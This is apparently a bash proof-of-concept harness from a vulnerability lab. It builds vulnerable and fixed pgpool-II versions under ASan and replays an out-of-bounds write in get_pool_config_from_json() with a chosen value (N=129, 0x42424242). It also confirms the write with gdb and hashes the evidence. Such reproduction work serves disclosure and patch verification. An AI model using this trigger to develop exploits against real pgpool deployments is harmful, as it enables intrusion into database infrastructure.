#!/bin/bash
# CVE-2026-92869 adjacent lane: direct-call replay against the real pinned
# get_pool_config_from_json() objects, with ASan and fixed controls.
# Builds ASan trees from the hash-verified tarballs if they are absent.
set -u
HERE="$(cd "$(dirname "$0")" && pwd)"
ROOT="$(cd "$HERE/../../.." && pwd)"
TARBALLS="$ROOT/lab/frontier/pgpool2shell/src"
WORK="${TMPDIR:-/tmp}/w7-pgpool-asan"
PLAIN="${TMPDIR:-/tmp}/w108-pgpool-replay"
OBJS="src/watchdog/wd_json_data.o src/utils/json.o src/utils/json_writer.o \
src/parser/list.o src/parser/stringinfo.o src/tools/fe_memutils.o \
src/tools/fe_port.o"

build_asan() {
    local ver="$1"
    local src="$WORK/pgpool-II-$ver"
    if [ -f "$src/src/watchdog/wd_json_data.o" ]; then
        return
    fi
    mkdir -p "$WORK"
    tar -xzf "$TARBALLS/pgpool-II-$ver.tar.gz" -C "$WORK" || exit 1
    (cd "$src" && ./configure --prefix="$WORK/inst-$ver" >/dev/null &&
     make -j4 CFLAGS="-g -O0 -fsanitize=address -fno-omit-frame-pointer" \
          LDFLAGS="-fsanitize=address") || exit 1
}

link() {
    local src="$1" out="$2" sanitize="$3"
    local inc="-I$src/src/include -I$src/src/include/parser -I/usr/include/postgresql -I$src"
    local objs=""
    local o
    # shellcheck disable=SC2086
    for o in $OBJS; do objs="$objs $src/$o"; done
    # shellcheck disable=SC2086
    gcc -g -O0 $sanitize -fno-omit-frame-pointer $inc -o "$out" \
        "$HERE/harness.c" $objs -lm -lcrypt -lresolv || exit 1
}

build_asan 4.7.2
build_asan 4.7.3
link "$WORK/pgpool-II-4.7.2" "$WORK/h7-vuln-asan" "-fsanitize=address"
link "$WORK/pgpool-II-4.7.3" "$WORK/h7-fixed-asan" "-fsanitize=address"
link "$PLAIN/pgpool-II-4.7.2" "$WORK/h7-vuln-plain" ""
link "$PLAIN/pgpool-II-4.7.3" "$WORK/h7-fixed-plain" ""

cd "$HERE" || exit 1
run() {
    local tag="$1" bin="$2"; shift 2
    echo "### $tag" > "evidence-$tag.txt"
    ASAN_OPTIONS=detect_leaks=0 "$bin" "$@" >> "evidence-$tag.txt" 2>&1
    echo "rc=$?" >> "evidence-$tag.txt"
    grep -E '^(### |payload_len|returned|ERROR:|==[0-9]+==ERROR|rc=|SUMMARY)' "evidence-$tag.txt"
}

echo "=== A: 4.7.2 plain, N=128 safe input ==="
run direct-vuln-n128 "$WORK/h7-vuln-plain" 128 0x42424242
echo "=== B: 4.7.2 plain, N=129 OOB write ==="
run direct-vuln-n129 "$WORK/h7-vuln-plain" 129 0x42424242
echo "=== C: 4.7.3 plain, N=129 fixed control ==="
run direct-fixed-n129 "$WORK/h7-fixed-plain" 129 0x42424242
echo "=== D: 4.7.2 ASan, N=128 safe input ==="
run asan-vuln-n128 "$WORK/h7-vuln-asan" 128 0x42424242
echo "=== E: 4.7.2 ASan, N=129 OOB write ==="
run asan-vuln-n129 "$WORK/h7-vuln-asan" 129 0x42424242
echo "=== F: 4.7.3 ASan, N=129 fixed control ==="
run asan-fixed-n129 "$WORK/h7-fixed-asan" 129 0x42424242
echo "=== G: gdb chosen-value readback, 4.7.2 plain N=129 ==="
gdb -q -batch -x "$HERE/gdb-write.cmd" "$WORK/h7-vuln-plain" \
    > evidence-gdb-write.txt 2>&1
grep -E '^\$1|^0x[0-9a-f]+:|^print|^x/wx' evidence-gdb-write.txt

# Normalized hashes: strip PIDs, ASan addresses, build paths and pointer values.
python3 - <<'PY'
import hashlib, pathlib, re
here = pathlib.Path('.')
patterns = [
    (re.compile(r'0x[0-9a-f]+'), '0xADDR'),
    (re.compile(r'0x[0-9A-F]+'), '0xADDR'),
    (re.compile(r'process \d+'), 'process PID'),
    (re.compile(r'==\d+=='), '==PID=='),
    (re.compile(r'pid \d+'), 'pid PID'),
    (re.compile(r'\d{4}-\d\d-\d\d \d\d:\d\d:\d\d\.\d+'), 'TIME'),
]
lines = []
paths = sorted(here.glob('evidence-*')) + sorted(here.glob('gdb-alias*.out')) + [here / 'gdb-w7.out']
for p in paths:
    if not p.is_file():
        continue
    text = p.read_text(errors='replace')
    for pattern, repl in patterns:
        text = pattern.sub(repl, text)
    lines.append(f"{hashlib.sha256(text.encode()).hexdigest()}  {p.name}\n")
pathlib.Path('EVIDENCE_HASHES.txt').write_text(''.join(lines))
print('wrote EVIDENCE_HASHES.txt')
PY
